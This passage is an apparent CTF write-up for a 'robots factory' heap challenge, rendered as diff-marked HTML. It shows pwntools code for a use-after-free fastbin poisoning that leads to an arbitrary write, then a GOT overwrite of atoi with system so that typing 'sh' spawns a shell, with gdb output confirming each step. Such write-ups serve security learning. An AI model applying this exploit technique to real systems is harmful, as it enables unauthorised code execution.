+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># We are going to overwrite atoi got with system</span>
+</span></span><span style="display:flex;"><span>atoi_got <span style="color:#555">=</span> exe<span style="color:#555">.</span>got[<span style="color:#c30">&#39;atoi&#39;</span>]
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;atoi address: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(atoi_got)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Points to the size of robots[3]</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Remember that fastbin is pretty strict with its chunk size, which is why we previously set</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># The robots[4] size to 0x111, so that it can be used as a fake fastbin chunk with size 0x110</span>
+</span></span><span style="display:flex;"><span>robot_memory_size_offset <span style="color:#555">=</span> <span style="color:#f60">0x4040c8</span>
+</span></span><span style="display:flex;"><span>edit(r,<span style="color:#f60">0</span>,p64(robot_memory_size_offset)) <span style="color:#09f;font-style:italic"># UAF,overwrite fastbin pointer to the robot memory size offset</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>create(r, tcache_size)
+</span></span><span style="display:flex;"><span>create(r, tcache_size) <span style="color:#09f;font-style:italic"># Now robot[1] point to the desired offset. We now have arbitrary write</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Now, robots[1] point to the desired offset&#39;</span>)
+</span></span><span style="display:flex;"><span>pause()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After the above execution, inspecting in gdb, we successfully create our arbitrary write primitive in the robots[1].</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  x/5gx &amp;robots
+</span></span><span style="display:flex;"><span>0x404100 &lt;robots&gt;:	0x0000000000000000	0x00000000004040d8
+</span></span><span style="display:flex;"><span>0x404110 &lt;robots+16&gt;:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x404120 &lt;robots+32&gt;:	0x0000000000000000
+</span></span><span style="display:flex;"><span>gef➤  x/10gx 0x00000000004040d8-0x10
+</span></span><span style="display:flex;"><span>0x4040c8 &lt;robot_memory_size+8&gt;:	0x0000011100002700	0x0000000000000111
+</span></span><span style="display:flex;"><span>0x4040d8:	0x0000000000000000	0x0000000100000000
+</span></span><span style="display:flex;"><span>0x4040e8 &lt;check_robot_slot+8&gt;:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x4040f8:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x404108 &lt;robots+8&gt;:	0x00000000004040d8	0x0000000000000000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Notice that robots[1] now points to robot_memory_size[3]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, with the feature <code>program_robot</code>, we can modify the <code>robots</code> array stored value, so that it points to our desired address. We can do this because the stored size of robots[1] in <code>robot_memory_size</code> array is large enough to reach the <code>robots</code>. Then with the <code>program_robot</code> to the element robots[0], we can write any value that we want.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#555">=</span> p64(<span style="color:#f60">1</span>)<span style="color:#555">*</span><span style="color:#f60">2</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(<span style="color:#f60">1</span>)<span style="color:#555">*</span><span style="color:#f60">3</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(atoi_got) <span style="color:#09f;font-style:italic"># Set robots[0] to atoi GOT</span>
+</span></span><span style="display:flex;"><span>edit(r,<span style="color:#f60">1</span>,payload) <span style="color:#09f;font-style:italic"># Arbitrary write</span>
+</span></span><span style="display:flex;"><span>edit(r,<span style="color:#f60">0</span>,p64(system_offset)[:<span style="color:#f60">2</span>]) <span style="color:#09f;font-style:italic"># Partial overwrite atoi to system</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Now, atoi is changed to system&#39;</span>)
+</span></span><span style="display:flex;"><span>pause()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notes that as mentioned before, this required bruteforce. For the sake of simplicity in this writeup, I manually set the correct system offset in my local. Below is the gdb inspection result.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>BEFORE
+</span></span><span style="display:flex;"><span>[0x404058] atoi@GLIBC_2.2.5  →  0x7ffff7a22670
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>AFTER
+</span></span><span style="display:flex;"><span>[0x404058] atoi@GLIBC_2.2.5  →  0x7ffff7a31420
+</span></span><span style="display:flex;"><span>gef➤  x/gx 0x7ffff7a31420
+</span></span><span style="display:flex;"><span>0x7ffff7a31420 &lt;__libc_system&gt;:	0xfa66e90b74ff8548
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, let&rsquo;s take a step back to look at the <code>robots_factory</code> menu code.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#c0f">robots_factory</span>(<span style="color:#078;font-weight:bold">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> iVar1;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Welcome to the secret robots factory!&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> ) {
+</span></span><span style="display:flex;"><span>    menu();
+</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#555">=</span> read_int();
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">==</span> <span style="color:#f60">4</span>) <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">&lt;</span> <span style="color:#f60">5</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">==</span> <span style="color:#f60">3</span>) {
+</span></span><span style="display:flex;"><span>        destroy_robot();
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">else</span> <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">&lt;</span> <span style="color:#f60">4</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">==</span> <span style="color:#f60">1</span>) {
+</span></span><span style="display:flex;"><span>          new_robot();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">else</span> <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">==</span> <span style="color:#f60">2</span>) {
+</span></span><span style="display:flex;"><span>          program_robot();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To process our input, it will call <code>read_int</code>.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">read_int</span>(<span style="color:#078;font-weight:bold">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> iVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_15 [<span style="color:#f60">5</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
+</span></span><span style="display:flex;"><span>  read(<span style="color:#f60">0</span>,local_15,<span style="color:#f60">4</span>);
+</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#555">=</span> atoi(local_15);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    __stack_chk_fail();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> iVar1;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As you can see, we can send a string with size limited to 4, and it will be passed to <code>atoi</code>.</p>
+<p>That means we just need to simply send <code>sh</code> during inputting the usual menu, and we gain a shell. In remote, We just need to run the below script many times, and if the ASLR of the libc base&rsquo;s last two bytes is 0x0000, we will successfully spawn the shell, like the picture below.</p>
+<p><p class="markdown-image">
+  <img src="https://i.imgur.com/Q9GR5gc.png" alt=""  />
+</p></p>
+<p>Full script:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
